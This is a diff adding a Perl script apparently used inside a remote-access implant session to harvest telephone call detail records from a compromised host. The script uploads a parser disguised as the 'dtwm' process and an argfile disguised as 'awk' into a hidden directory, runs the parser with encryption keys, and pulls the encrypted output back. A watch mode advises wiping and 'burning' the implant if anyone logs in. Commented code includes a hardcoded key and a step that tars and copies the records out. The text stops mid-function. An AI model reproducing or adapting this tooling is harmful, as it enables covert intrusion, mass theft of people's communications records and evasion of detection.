@@ -1,0 +1,1347 @@
+#!/usr/bin/env perl
+##
+$VER="1.2.1.4";
+
+# TODO: Have the -W process popup the ps output of our watcher process.
+
+$| = 1 ;
+
+my (@cuplines,$cdroutput,$cdrnopenlines,@cdroutput) = ();
+$cryptkey="";
+$cupname = "";
+
+myinit() ;
+
+# ASSERT: pulling data from %pathmasks
+my @lssargs = ("-ZF");
+push(@lssargs,"-V$opt_b") if $opt_b;
+
+doit("mkdir -p $workdir");
+
+my @completelssoutput = ();
+foreach my $dirmask (sort keys %pathmasks) {
+  my ($year,$mon,$day) = ();
+  my $filemask = $pathmasks{$dirmask};
+  my ($yearstart,$monthstart,$daystart) = $mindate =~ /^(\d{4})(\d\d)(\d\d)/;
+  my ($yearend,$monthend,$dayend)       = $maxdate =~ /^(\d{4})(\d\d)(\d\d)/;
+dbg(" OUTSIDE YEAR
+ (yearstart,monthstart,daystart) = ($yearstart,$monthstart,$daystart) = $mindate 
+ (yearend,monthend,dayend)       = ($yearend,$monthend,$dayend)       = $maxdate 
+");
+
+  for ($year = $yearstart ; $year <= $yearend ; $year++) {
+dbg("OUTSIDE MONTH
+year=$year=
+");
+    $monthstart = 1 if ($year > $yearstart);
+    for ($mon = $monthstart ; ($year != $yearend or $mon <= $monthend) ; $mon++) {
+dbg(" OUTSIDE DAY
+year=$year=
+mon=$mon=
+");
+      if ($mon >= 13) {
+	last;
+      }
+      $daystart = 1 if ($mon > $monthstart or $year > $yearstart);
+      my $badday = 0;
+      for ($day = $daystart; $day <= 31; $day++) {
+#dbg("INSIDE DAY
+#year=$year=
+#mon=$mon=
+#day=$day=
+#");
+
+	last if ($day > $dayend and
+		 $mon == $monthend and
+		 $year == $yearend
+		);
+	if ($day > 31 or
+	    ($day > 29 and $mon == 2) or
+	    ($day > 30 and ($mon == 9 or $mon == 11 or $mon == 4 or $mon == 6))
+	   ) {
+	  $badday++;
+	  last;
+	}
+	my $dirmask2 = $dirmask;
+	my $filemask2 = $filemask;
+	my $ymdate  = sprintf("%04d%02d%02d",$year,$mon,$day);
+	my $yearmon = sprintf("%04d%02d",$year,$mon);
+	$filemask2 =~ s/YYYYMMDD/$ymdate/;
+	$dirmask2  =~ s/YYYYMM/$yearmon/;
+dbg("GOT:
+dirmask2=$dirmask2=
+dirmask=$dirmask=
+filemask=$filemask=
+pathend=$pathend=
+
+lssargs=(@lssargs)
+
+");
+	my ($output,$nopenlines,@output) = 
+	  nopenlss(@lssargs,"$dirmask2$filemask2$pathend");
+	push(@completelssoutput,@output);
+      }
+      if ($badday) {
+	$badday = 0;
+      }
+    }
+  }
+}
+
+mydie("No target files found from $mindate to $maxdate")
+  unless @completelssoutput;
+
+# TODO:  add =df check of file system size
+
+
+
+dbg("
+
+".join("\n",@completelssoutput)."
+
+Those were the ".scalar @completelssoutput." entries in \@completelssoutput.
+
+
+
+WHOA, Nelly!
+
+
+");
+
+
+# OK, good to go. We process $processcount at a time
+my $done = 0;
+
+my ($bytecount,$filecount) = (0,0);
+
+mkdir($datadir);
+
+my ($postdfoutput,@postdfoutput,$postdfpct,$skiprm) = ();
+while (! $done) {
+
+  my @nextbatch = splice(@completelssoutput,0,$processcount);
+  my @originalfiles = ();
+  my $list = "";
+  my ($uncompress,$gz,$Z,$bz2) = ();
+  my ($skipbatch,$datafile) = ();
+  foreach (@nextbatch) {
+    $filecount ++;
+    my ($size,$mon,$file) = m,\s\d+\s+\S+\s+\S+\s+(\d+)\s+(Jan|Feb|Mar|Apr|May|Jun|Jul|Aug|Sep|Oct|Nov|Dec).*\d\d:\d\d \d\d\d\d (/.*),;
+    if ($file =~ /\.gz$/ and !$gz++) {
+      $gunzipopts = getverboseopt("gunzip") unless (length $gunzipopts);
+      $uncompress .= "; " if $uncompress;
+      $uncompress .= "gunzip$gunzipopts $workdir/*.gz";
+    } elsif ($file =~ /\.Z$/ and !$Z++) {
+      $uncompressopts = getverboseopt("uncompress") unless (length $uncompressopts);
+      $uncompress .= "; " if $uncompress;
+      $uncompress .= "uncompress$uncompressopts $workdir/*.Z 2>/dev/null || gzip -d $workdir/*.Z";
+    } elsif ($file =~ /\.bz2$/ and !$bz2++) {
+      $bunzip2opts = getverboseopt("bunzip2") unless (length $bunzip2opts);
+      $uncompress .= "; " if $uncompress;
+      $uncompress .= "bunzip2$bunzip2opts $workdir/*.bz2";
+    }
+    $list .="$file ";
+    # First file in batch determines our local filename for .enc file
+    unless ($datafile) {
+      $datafile = "$file.enc";
+      $datafile =~ s,/,_,g;
+      if (-f "$datadir/$datafile") {
+	# Then this batch has been written already, we skip this time
+	$skipbatch++;
+      }
+    }
+    if (!$skipbatch and $list and length $list > 1990) {
+      my ($output,,@output) = doit("cp -p $list $workdir ; echo $?");
+      $list="";
+      mydie("Copy command resulted in an error")
+	if ($output[$#output] ne "0");
+    }
+  }
+  if (!$skipbatch and $list) {
+    dbg("list=$list=");
+    my ($output,,@output) = doit("cp -p $list $workdir ; echo $?");
+    $list="";
+    mydie("Copy command resulted in an error")
+      if ($output[$#output] ne "0");
+  }
+  if ($skipbatch) {
+    mywarn("SKIPPING THIS BATCH DONE ALREADY EARLIER");
+    doit("rm -f $workdir/*") unless $skiprm++;
+    $done++ unless @completelssoutput;
+    next;
+  }
+  doit("-ls $workdir");
+  if ($uncompress) {
+    my ($output,,@output) = doit("$uncompress ; echo $?");
+    mydie("$uncompress command resulted in an error")
+      if ($output[$#output] ne "0");
+    doit("-ls $workdir");
+    unless ($postdfpct) {
+      ($postdfoutput,$postdfavail,$postdfpct,@postdfoutput) = mydfcheck($workdirparent);
+      my $pctchange = ((100 * $postdfpct / $predfpct) - 100)
+	if $predfpct > 0;
+dbg("pctchange=$pctchange=");
+      $pctchange = sprintf("%2.1f",$pctchange);
+dbg("
+
+
+pre=(@predfoutput)
+post=(@postdfoutput)
+
+pre=$predfoutput=
+post=$postdfoutput=
+
+
+
+pctchange=$pctchange= ((100 * $postdfpct / $predfpct) - 1);");
+      offerabort
+	("Prior to  cp/uncompress, =df $workdirparent returned:\n   ".
+	 join("\n   ",@predfoutput)."\n".
+	 "After the cp/uncompress, =df $workdirparent returned:\n   ".
+	 join("\n   ",@postdfoutput)."\n".
+	 "The file system with our temporary files shrunk after cp/uncompress by:\n".
+	 "            int($predfavail-$postdfavail)=".int($predfavail-$postdfavail)." kbytes, or $pctchange%.".
+	 "");
+    }
+  }
+  my ($output,$nopenlines,@output) =
+# FOR DEBUGGING ONLY ECHO OUTPUT HERE MESSES UP OUR OUTPUT FILES
+#    doit("cd $workdir; cp ../awk . ;export  B=\"--Ct_#37Uw5_80n -m 4 -k $cryptkey -l '$workdir/*' -P ./awk\" ; echo B is \$B ; echo ; $runas ; echo");
+    doit("cd $workdir; cp ../awk . ;export  B=\"$parserkey -m 4 -k $cryptkey -l '$workdir/*' -P ./awk\"  ; $runas ; echo");
+dbg(" 
+
+
+
+output=$output=
+
+
+
+");
+  $bytecount += length $output;
+  if (open(CDROUT,">>$datadir/$datafile")) {
+    chomp($output);
+    print CDROUT $output;
+  } else {
+    mydie("$!: OPEN >>$datadir/$datafile FAILED");
+  }
+  close(CDROUT);
+
+  doit("rm -f $workdir/*");
+#mydie("TEST PASS DONE REMOVE THIS mydie IF GOOD");
+  $done++ unless @completelssoutput;
+}
+
+my ($s,$moredate) = ();
+unless (!$maxdate or $maxdate eq $mindate) {
+  $s = "s";
+  $moredate = " through $maxdate";
+}
+
+
+$s = $filecount > 1 ? "s" : "";
+
+mydie("DONE with date$s $mindate$moredate
+
+This instance of $prog processed:\n\n
+     $filecount file$s, bringing back $bytecount bytes
+
+If a watch mode $prog is still running, and ALL instances of
+$prog are done, paste this in any NOPEN
+window, this touch will cause the watch mode to clean up:
+
+  -cd /tmp
+  -lsh touch $opdir/BAILNOW
+
+And (again, if ALL instances are done), this will start a Pack-up
+mode instance of $prog:
+
+$prog $origargs -P
+
+
+");
+
+
+
+# BELOW HERE IS OLD START HERE
+
+exit;
+
+
+#my @getlist = ();
+
+#foreach (@completelssoutput) {
+#  my ($size,$file) = m,\s\d+\s+\S+\s+\S+\s+(\d+)\s+(Jan|Feb|Mar|Apr|May|Jun|Jul|Aug|Sep|Oct|Nov|Dec).*\d\d:\d\d \d\d\d\d (/.*),;
+#  next unless $size > 0;
+#  push (@getlist,$file);
+#}
+
+##TODO: needs to prompt the user making sure this is an alright directory to create...
+
+##creates p dir
+#my $remoteCWD = $targetcwd . "\/p";
+#doit ("echo creating $remoteCWD");
+#doit ("mkdir $remoteCWD");
+
+##/current/up/cursetingle.v1.1.1.1.AIX.5.1.targetdl
+#my @cmdList = ();
+## TODO: need to put in warning about loading parser and arg file in the correct dir...
+
+## creates a list of files with .enc1 added
+##foreach (@getlist){
+##    push (@cmdList, "$_\.enc1");
+##}
+
+##uploads the parser; uploading as dtwm (blends in better with other processes)
+#doit ("-put /current/up/cursetingle.v1.1.1.1.AIX.5.1.targetdl $targetcwd/dtwm");
+#doit ("-put /current/down/argfiles/argfile_forward.enc $targetcwd/awk");
+
+##loads an array with the commands
+
+#my $execCmd = "";
+#doit ("-lsh mkdir -p $localcwd/coll");
+#doit ("-lsh mkdir -p $localcwd/coll/$nopen_rhostname");
+
+##foreach (@getFileList)
+##{
+##   # rm previous directory
+##    $execCmd = "rm -f $remoteCWD/*\; ";
+    
+##    # cp gzip file and uncompress...
+##    $execCmd .= "cp $cdrDir/$_ $remoteCWD; gunzip $remoteCWD/*.gz ; ";
+    
+##    # cp support files
+###    $execCmd .= " cp $targetcwd/awk $remoteCWD ; ";
+    
+##    # fire parser
+###    $execCmd .= "B=\'--Ct_#37Uw5_80n -m 4 -k da27cfbedb0d188a56d97ccccf4aa11e -l $remoteCWD/* -P $remoteCWD/awk\' $targetcwd/dtwm ";
+##    $execCmd .= " cat $remoteCWD/* ";
+    
+##    # write results
+##    $execCmd .= " >T:$localcwd/coll/$nopen_rhostname/$_.enc1";
+
+##    doit ("$execCmd");
+##}
+
+
+## remove everything
+## TODO: prompt for checks!!!
+#doit ("/bin/rm -f $targetcwd/awk $targetcwd/dtwm");
+#doit ("/bin/rm -rf $remoteCWD");
+
+#$cryptkey = "da27cfbedb0d188a56d97ccccf4aa11e";
+
+#progprint(".\nWill be running this for each filename i:\n $COLOR_FAILURE\n cryptTool.v1.0.Linux2.4.18-14.targetdl -i \$i -o \`basename \$i\`.txt1 -k $cryptkey -d -c ");
+
+##my $cdroutputDir = $localcwd . "/coll/" . $nopen_rhostname;
+##doit("-lsh for i in $cdroutputDir/* ; do cryptTool.v1.0.Linux2.4.18-14.targetdl -i \$i -o \$n.txt -k da27cfbedb0d188a56d97ccccf4aa11e -d -c ; done");
+#doit("-lsh cd /current/down/coll/$nopen_rhostname ; for i in * ;do cryptTool.v1.0.Linux2.4.18-14.targetdl -i \$i -o \`basename \$i\`.txt1 -k $cryptkey -d -c ; done");
+
+#doit("-lsh mkdir /current/cdrtar; cp -R /current/down/coll/$nopen_rhostname /current/cdrtar; cd /current/cdrtar/$nopen_rhostname; find . -empty -print | xargs /bin/rm ; find . -print | egrep -v \".txt1\" | xargs /bin/rm -r");
+
+#progprint(".\nThe tar and exfil option was entered on the command line.\n $COLOR_FAILURE\n Will now tar all decrypted data. \n\n The file will be named /current/cdrtar/cdrhits.$projectname.$nopen_rhostname.tar.bz2 ");
+#doit("-lsh tar cvjf /current/cdrtar/cdrhits$projectname.$nopen_rhostname.tar.bz2 /current/cdrtar/$nopen_rhostname");
+##copy-fast tar file
+#progprint(".\n $COLOR_FAILURE\n Will now copy fast /current/cdrtar/cdrhits.$projectname.$nopen_rhostname.tar.bz2 \n\n Watch to make sure it doesn't fail !");
+#doit("-lsh 1x -hold -e /usr/local/bin/copy-fast NOZIP /current/cdrtar ");
+
+
+#exit;
+
+
+sub myinit {
+  $willautoport=1;
+  my $autoutils = "../etc/autoutils" ;
+  unless (-e $autoutils) {
+    $autoutils = "/current/etc/autoutils" ;
+   }
+  require $autoutils;
+  $prog = "-gs getcdrhitsgz";
+  $vertext = "$prog version $VER\n" ;
+  mydie("No user servicable parts inside.\n".
+	"(I.e., noclient calls $prog, not you.)\n".
+	"$vertext") unless ($nopen_rhostname and $nopen_mylog and
+			    -e $nopen_mylog);
+
+  $usagetext="
+Usage: $prog [-h]                       (prints this usage statement)
+
+NOT CALLED DIRECTLY
+
+$prog is run from within a NOPEN session when \"$prog\" or
+\"=getcdrhitsgz\" is used.
+
+";
+
+
+  # DEFAULTS
+  $def_E = ".gz";
+  $def_C = 10;
+  $def_c = "procclean";
+  $def_r = "dtwm";
+  $def_S = "17";
+  $def_s = "9000";
+  $def_i = "1800";
+  $def_f = 85;
+  $def_j = 2;
+
+  $datadir = "$opdown/via.getcdrhitsgz.$nopen_rhostname";
+
+  $bailfile = "$optmp/BAILGETCDRHITS.$$";
+
+  @defpaths = ("er*/aux_*/output/final");
+  
+
+  mydie("bad option(s)") if (! Getopts( "hvl:d:L:b:k:K:T:E:m:M:C:Ww:c:S:s:Bi:Pf:j:" ) ) ;
+
+  $watchmode = ($opt_W or $opt_w);
+  $packmode = $opt_P;
+
+  $gsusagetext= setusagetext();
+  usage() if ($opt_h or $opt_v);
+  $dfpctalert = defined $opt_f ? $opt_f : $def_f;
+  $dfjumppctalert = defined $opt_j ? $opt_j : $def_j;
+  $cupname = defined $opt_c ? $opt_c : $def_c;
+  $cupinactivedelay = defined $opt_i ? $opt_i : $def_i;
+  $cupsleep = defined $opt_s ? $opt_s : $def_s;
+  $runas = defined $opt_r ? $opt_r : $def_r;
+  $processcount = defined $opt_C ? $opt_C : $def_C;
+  $checkdelay = defined $opt_S ? $opt_S : $def_S;
+  $pathend = defined $opt_E ? $opt_E : $def_E;
+  $pathmask = $opt_L;
+  $listfile = $opt_l;
+
+  if ($watchmode) {
+    # Options here only matter in $watchmode
+    mydie("-S $checkdelay must be a positive integer at most 300")
+      if (!($checkdelay =~ /^\d+$/) or
+	  $checkdelay == 0 or
+	  $checkdelay > 500
+	 );
+
+  } else {
+    # These options do not matter in $watchmode
+    mydie("-C $processcount must be a positive integer at most 500")
+      if (!($processcount =~ /^\d+$/) or
+	  $processcount == 0 or
+	  $processcount > 500
+	 );
+    
+    # Building regexp for file matching.
+    # FILENAME ENDING/EXTENSION IF ANY
+    if ($pathend eq "NONE") {
+      $pathend = "*";
+    } else {
+      $pathend = "*$pathend";
+    }
+    
+    mydie("Either or both -l/-L PATHmask option is required") unless $pathmask or $opt_l;
+    mydie("-L PATHmask must start with /")
+      if ($pathmask and !($pathmask =~ m,^/.+,));
+    
+    @pathmasks = split(/,,/,$pathmask);
+    %pathmasks = ();
+    if ($listfile) {
+      if (open(GETCDRHITSIN,$listfile)) {
+	while (<GETCDRHITSIN>) {
+	  s/^\s*//;
+	  s/\s*$//;
+	  next if /^#/;
+	  unless (m,^/.+,) {
+	    mywarn("Ignoring malformed mask from $listfile: $_");
+	    next;
+	  }
+	  push(@pathmasks,$_) if $_;
+	}
+	close(GETCDRHITSIN);
+      } else {
+	mydie("Cannot open listfile (-l) $listfile");
+      }
+    }
+    
+    foreach (@pathmasks) {
+      mydie("PATH masks must contain both YYYYMM and YYYYMMDD strings,\n".
+	    "(The letters YYYYMM and YYYYMMDD, no digits!!)\n".
+	    "e.g.:\n\n".
+	    "  /rmhome/cdrfile/bak/voiceadencdr/cdr.HW*YYYYMM/HW*YYYYMMDD*")
+	unless (/YYYYMM.*YYYYMMDD/);
+      my ($dirmask,$filemask) = m,^(/.*YYYYMM/)([^/]+YYYYMMDD),;
+      $pathmasks{$dirmask} = $filemask;
+    }
+    mydie("No valid PATH masks provided, use either -L or -l option to do so.")
+      unless (%pathmasks);
+    
+    # Date ranges, last part we use to filter data files
+    $mindate = $opt_m;
+    mydie("-m option is required") unless $mindate;
+    mydie("-m $mindate option not in YYYYMMDD format")
+      unless ($mindate =~ /^\d{8}$/);
+    $maxdate = defined $opt_M ? $opt_M : $opt_m;
+    mydie("-M $maxdate option not in YYYYMMDD format")
+      unless ($maxdate =~ /^\d{8}$/);
+    mydie("-m $mindate is NOT less than or equal to -M $maxdate")
+      unless (19000100 < $mindate and
+	      $mindate <= $maxdate and
+	      $maxdate < 99991232
+	     );
+    my ($m,$d) = $maxdate =~ /(\d\d)(\d\d)$/;
+    mydie("Invalid month or day in -M $maxdate")
+      unless ($m > 0 and $m < 13 and
+	      $d > 0 and $d < 32);
+    ($m,$d) = $mindate =~ /(\d\d)(\d\d)$/;
+    mydie("Invalid month or day in -m $mindate")
+      unless ($m > 0 and $m < 13 and
+	      $d > 0 and $d < 32);
+    
+    if ($skipexpr = $opt_b) {
+      mydie("-b \"$skipexpr\" cannot contain whitespace")
+	if $skipexpr =~ /\s/;
+      my @exprs = split(/,,/,$skipexpr);
+      $skipexpr = "";
+      foreach (@exprs) {
+	$skipexpr .= "\|$_";
+      }
+    }
+    $skipexpr =~ s/^\|//;
+  }
+#dbg("verbose=$verbose= opt_V=$opt_V");
+
+  if ($opt_d) {
+    $workdir = $opt_d;
+  }
+
+  $socket = pilotstart(quiet);
+
+  # grabs the cwd
+  ($clientver,$histfile,$cmdoutfile,$localcwd,$nhome,
+   $localpid,$localppid,$serverver,$wdir,$targetos,
+   $targetcwd,$targetpid,$targetppid) = parsestatus("force");
+
+  if (!$watchmode and !$packmode and
+      $host_hiddendir and
+      not ($targetcwd =~ m,^$host_hiddendir/[^/]+,)) {
+    my ($prompt,$more2) =
+      (
+       "You have a hidden directory:  $host_hiddendir\n".
+       "It would make sense to use a sub-sub-directory under there to work.\n\n".
+       "Do you want to create and use this for your parent working directory?\n".
+       "         $host_hiddendir/cdz",
+      );
+    ($ans) = mygetinput
+      ($prompt,
+       "Y"
+      );
+    if ($ans eq "y") {
+      doit("mkdir $host_hiddendir/cdz",
+	   "-cd $host_hiddendir/cdz");
+#      ($clientver,$histfile,$cmdoutfile,$localcwd,$nhome,
+#       $localpid,$localppid,$serverver,$wdir,$targetos,
+#       $targetcwd,$targetpid,$targetppid) = parsestatus("force");
+      ($cdroutput,$cdrnopenlines,@cdroutput) =
+	doit("-ls -d $host_hiddendir/cdz");
+      if ($cdroutput =~ /^d.*cdz$/) {
+	my $mored = "\n$COLOR_FAILURE AND REMOVE  -d $opt_d option" if $opt_d;
+	mydie("OK, up-arrow and try again from this directory$mored.");
+      } else {
+	mydie("Cannot mkdir $host_hiddendir/cdz. Something is wrong.");
+      }
+    }
+  }
+
+  my $defaultstr = "";
+  my ($wdirname,$wdirext) = ("c",0);
+  unless ($workdir) {
+    ($cdroutput,$cdrnopenlines,@cdroutput) =
+      doit("-ls $targetcwd");
+    my @dirs = grep /^d/,@cdroutput;
+    @dirs = grep !/\s\.{1,2}$/,@dirs;
+    while (1) {
+      $wdirext++;
+dbg("
+Looking for  grep /\\d\\s$targetcwd/$wdirname\\.$wdirext\$/,\@dirs
+Got dirs=(\n".join("\n",@dirs).")");
+      next if grep m,\d\s$targetcwd/$wdirname\.$wdirext$, ,@dirs;
+      last;
+    }
+    $workdir = "$targetcwd/$wdirname.$wdirext";
+    $defaultstr = "Defaulting to next available working directory, $workdir.\n\n";
+  }
+  $workdir =~ s,/+,/,g;
+  $workdirparent = dirname($workdir);
+
+  # Some more checking on target before we commit
+  ($cdroutput,$cdrnopenlines,@cdroutput) = doit("-ls -d $workdir");
+  mydie("Target working directory $workdir cannot already exist")
+    if ($cdroutput);
+  if ($workdirparent =~ m,^/+$,) {
+    doit("pwd","-cd /tmp");
+    mydie("Your NOPEN CWD was not valid!!\n".
+	  "Just did a -cd /tmp, so try again.");
+  }
+  mydie("WTF?") if ($workdirparent eq $workdir);
+
+  mydie("Parent of your workdir CANNOT be /tmp (we wipe from parent on down)")
+    if ($workdirparent =~ m,/+tmp/*$,);
+
+
+  # All we need is now set for watch process.
+  if ($watchmode) {
+    watchbail($opt_w);
+  }
+
+  if ($opt_k) {
+    $cryptkey = lc $opt_k;
+  }
+
+  mydie("Required -k argument must be all hex")
+    unless ($cryptkey =~ /^[0-9a-f]+$/);
+
+  # Now the local cryptTool.
+  chomp($crypttool = `which cryptTool`);
+  unless ($crypttool) {
+    chomp($crypttool = `ls -rt $opbin/cryptTool*Linux* | tail -1`);
+    while (!($crypttool and -f $crypttool and -x _ and -s _)) {
+      ($ans,$crypttool) = mygetinput("What local cryptTool should we use (or enter ABORT)?");
+      mydie("User aborted") if $crypttool eq "ABORT";
+    }
+  }
+  progprint($COLOR_NORMAL."\n\nUsing local tool $crypttool");
+
+  # All we need for packmode is now set
+  if ($packmode) {
+    packupanddie($opt_T);
+  }
+
+  if ($opt_K) {
+    $parserkey = $opt_K
+  }
+  mydie("-K argument is required")
+    unless ($parserkey);
+
+
+#  my $touchfile = "$workdirparent";
+#  $touchfile =~ s,/,_,g;
+#  $touchfile = "$optmp/CREATED.$touchfile";
+  ($cdroutput,$cdrnopenlines,@cdroutput) =
+    doit("ls -d $workdirparent || mkdir -p $workdirparent");
+dbg("output=$cdroutput=");
+  if ($cdroutput =~ /no such/i) { # so it didn't exist, now it does
+#    `touch $touchfile`;
+    ($cdroutput,$cdrnopenlines,@cdroutput) =
+      doit("ls -d $workdirparent");
+    mydie("WTF? The directory should be there now???")
+      unless $cdroutput eq "$workdirparent\n";
+  } elsif ($cdroutput =~ m,^$workdirparent\s*$,) {
+    offerabort($defaultstr.
+	       "Parent  directory ($workdirparent) of\n".
+	       "working directory ($workdir)\n".$COLOR_FAILURE.
+	       "ALREADY EXISTS!\n\n".$COLOR_NORMAL.
+	       "This is fine if $workdirparent is our directory already.\n\n".
+	       "When/if $prog bails, it will issue the command:\n".
+	       "   rm -rf $workdirparent\n\n".
+	       "You should only continue if you know that is our directory for sure."
+	      );
+  } else {
+    mydie("Unexpected result, is $workdirparent a file?");
+  }
+	    foreach my $dir (keys %pathmasks) {
+    $dir = dirname($dir);
+    ($cdroutput,$cdrnopenlines,@cdroutput) = doit("-ls -d $dir");
+    mydie("Target directory $dir does NOT exist")
+      unless ($cdroutput);
+  }
+
+  nopenaddpath($workdirparent);
+
+  # First, the parser. Figure out which or if it is there already.
+  my $uploadparser = 1;
+  my ($listing) = doit("-ls $workdirparent/$runas");
+  $parser = "";
+  if ($listing) {
+    mydie("Something is wrong, $runas exists on target as a non-file")
+      unless ($listing =~ /^-/);
+    ($ans) = mygetinput
+      ("$workdirparent/$runas is already there.\n\n".
+       "Is that the correct parser?","Y");
+    if ($ans eq "y") {
+      $uploadparser = 0 ;
+    } else {
+      doit("-rm $workdirparent/$runas");
+    }
+  }
+  if ($uploadparser) {
+    # So not there yet
+#    $listing = `find $opup/curse* -type f -ls | lss | sed "s/.* -rw.* root//g" |tee /tmp/listing`;
+#    $listing = `find $opup/curse* -type f -ls | lss `;
+#    $listing = `find $opup/curse* -type f -o -type l`;
+    $listing = `ls -alL $opup/curse*/curse* 2>/dev/null | sed "s/.* root//g"`;
+    $listing = `ls -alL $opup/curse* 2>/dev/null | sed "s/.* root//g"` unless $listing;
+dbg("FIRSTLISTING:
+
+
+
+$listing
+
+
+");
+    my @list = parelist(split(/\n/,$listing));
+    $listing = join("\n",@list);
+dbg("NEWPAREDGLISTING:
+
+
+$listing
+
+
+");#    $listing = `find $opup/curse* -type f -ls | sed "s/.* -rw.* root//g" |tee /tmp/listing`;
+#    chomp($parser = `find $opup/curse* -type f -ls | lss | grep -i aix | tail -1`)
+#      if $aixtarget;
+#    chomp($parser = `find $opup/curse* -type f -ls | lss | grep -i sunos | tail -1`)
+#      if $sunostarget;
+    ($parser) = $list[$#list] =~ m,\s\d+\s(/.*),;
+    #    ($parser) = $parser  =~ m,\s\d+\s(/.*),;
+    $parser = "" unless (-f $parser);
+    $listing .= "\n\n" if $listing;
+    ($ans,$parser) = mygetinput
+      ($listing.
+       "Choose parser to upload.\n",$parser);
+    $parser = $1 if $parser  =~ m,\s\d+\s(/.*),;
+  }
+  
+  #for i in argfile* ; do cryptTool.v1.0.Linux2.4.18-14.targetdl -i $i -o `basename $i .txt`.enc -k da27cfbedb0d188a56d97ccccf4aa11e -b ; done
+  
+  ($cdroutput,$cdrnopenlines,@cdroutput) = doit("-ls -d $workdirparent/awk");
+  my $uploadawk = 1;
+  if ($cdroutput) {
+    ($ans) = mygetinput
+      ("awk is already in $workdirparent.\n".
+       "Is that the correct argfile?","Y");
+    if ($ans eq "y") {
+      $uploadawk = 0 ;
+    } else {
+      doit("-rm $workdirparent/awk");
+    }
+  }
+  if ($uploadawk) {
+    # Now the argfiles. Encrypt any not ending in .enc,
+    # touch to same time as original.
+    $listing = `find $opdir/ -type f -ls | lss | grep -i argfile | sed "s/.*root //g"`;
+    dbg("find $opdir/ -type f -ls | lss | grep -i argfile | sed \"s/.*root //g\"
+
+argfile listing=$listing=");
+    my @tmp = split(/\n/,$listing);
+    my ($encryptedcount,$cleartext) = ();
+    foreach (grep !/enc$/,@tmp) {
+      ($argfile) = m,\s\d+:\d\d\s(/.*),;
+      my $newfile = $argfile;
+      $newfile =~ s/\.txt$//;
+      $newfile .= ".enc";
+      $encryptedcount++;
+      $cleartext .=    ":::::::::::::: ${argfile} BEGIN\n".
+	`cat $argfile`.":::::::::::::: ${argfile} END\n";
+      dbg("Running: $crypttool -i $argfile -o $newfile -k $cryptkey -b
+".    `$crypttool -i $argfile -o $newfile -k $cryptkey -b 2>&1`);
+      
+      `$crypttool -i $argfile -o $newfile -k $cryptkey -b`;
+      `touch -r $argfile $newfile`;
+    }
+    $listing = `find $opdir/ -type f -ls | lss | grep -i argfile.*enc\$ | sed "s/.*root //g"`;
+    @tmp = split(/\n/,$listing);
+    ($argfile) = $tmp[$#tmp] =~ m,\s\d+:\d\d\s(/.*),;
+    if (!($argfile =~ /enc$/)) {
+      ($argfile) = $tmp[$#tmp - 1] =~ m,\s\d+:\d\d\s(/.*),;
+    }
+    $listing .= "\n\n" if $listing;
+    $listing = "Cleartext Argfiles:\n$cleartext\n\n$listing"
+      if $cleartext;
+
+    $listing .= "(Just encrypted $encryptedcount argfiles)\n\n"
+	if $encryptedcount;
+    ($ans,$argfile) = mygetinput
+      ($listing.
+       "Argfile to use?",$argfile);
+  }
+  offerabort("Last chance to abort before processing begins.");
+  if ($parser) {
+    mydie("Parser ($parser) and argfile ($argfile)\n".
+	  "must exist locally and be non-empty:\nls -al $parser $argfile\n".
+	  `ls -al $parser $argfile`)
+      unless (-f $parser and -s $parser and
+	      -f $argfile and -s $argfile);
+  }
+
+  ($predfoutput,$predfavail,$predfpct,@predfoutput) = mydfcheck($workdirparent);
+
+  if ($uploadawk) {
+    mydie("Argfile ($argfile)\n".
+	  "must exist locally and be non-empty:\nls -al $argfile\n".
+	  `ls -al $argfile`)
+      unless (-f $argfile and -s $argfile);
+    my $test = `file $argfile | grep -i ascii`;
+    mydie(".\n\nfile $argfile\n$test\n\nArgfile cannot be ascii.")
+      if (length $test > 4);
+    doit("-put $argfile $workdirparent/awk");
+  }
+  doit("-put $parser $workdirparent/$runas");
+
+} #myinit
+
+sub mydfcheck {
+  local ($path) = (@_);
+  my ($dfoutput,$nopenlines,@dfoutput) = doit("=df $path");
+dbg("dfoutput=(\n".join("\n",@dfoutput)."\n)");
+  my $index = findindex("avail",split(/\s+/,$dfoutput[0]));
+  $index = findindex("free",split(/\s+/,$dfoutput[0])) unless $index > 0;
+  for (my $i=0;$i<@dfoutput;$i++) {
+    next if ($dfoutput[$i] =~ /(avail|free)/i);
+    if (!($dfoutput[$i] =~ /^\/.*\d+\s+\d+\s+\d+\s+\d+\%/) and
+	($dfoutput[$i+1] =~ /^\s+\d+\s+\d+\s+\d+\s+\d+\%/) ) {
+      $dfoutput[$i] .= " ".$dfoutput[$i+1];
+      $dfoutput[$i+1] = "";
+    }
+  }
+dbg("AFTER dfoutput=(\n".join("\n",@dfoutput)."\n)");
+  @dfoutput = grep !/filesystem/i, grep /\%/,@dfoutput;
+  $dfoutput = join("\n",@dfoutput);
+  my ($dfpct) = $dfoutput =~ /(\d+)\%/;
+  my @tmp = split(/\s+/,$dfoutput[$#dfoutput]);
+  my $dfavail = $tmp[$index];
+dbg("tmp=(\n".join("\n",@tmp)."\n) and index=$index");
+dbg("mydfcheck(@_)   return($dfoutput,$dfavail,$dfpct,@dfoutput);");
+  return($dfoutput,$dfavail,$dfpct,@dfoutput);
+}
+
+sub watchbail {
+  local ($psregexp) = (@_);
+  my $touchfile = "$opdir/BAILNOW";
+  my $stopfile = "$opdir/STOPWATCH";
+  if (-e $touchfile or -e $stopfile) {
+    offerabort(`ls -al $stopfile $touchfile 2>/dev/null`."\n".
+	       "We only just got started, and the above file(s) already exists.\n".
+	       "If you continue here, it will be deleted so we can start our watch");
+    unlink($stopfile,$touchfile);
+  }
+  my $prompt =
+    "This watch mode $prog will recommend you bail if any of the\n".
+    "following happen:\n\n".
+    " * someone logs in\n".
+    " * your CUP script dies and $workdirparent is still there\n".
+    " * the file system grows over $dfpctalert\% full\n".
+    " * the file system grows by $dfjumppctalert\% in $checkdelay seconds\n".
+    " * the local file $touchfile exists\n".
+    " * it sees TWO or more ps commands running (not just us)\n".
+    "\n".
+    "To force cleanup for all instances of $prog using a working directory\n".
+    "beneath $workdirparent, you can LOCALLY execute the touch below\n\n".
+    "Bailing will entail executing the following on target:\n\n".
+    "     rm -rf $workdirparent\n".
+    "     -burn\n\n".
+    "Note, you will have to answer \"BURN\" to the -burn prompt to complete\n".
+    "the bail process.";
+  my ($localcup,$contents) =
+    buildcup($workdirparent,$cupname,$cupsleep);
+
+  my $testsecs = $cupsleep - 1;
+  my $origprompt = $prompt;
+  # Cannot be in the dir you run rm -rf from.
+  $contents .= "$COLOR_FAILURE\n".
+    "NOTE: We prefer the \"bash\" shell, but apparently that is not in\n".
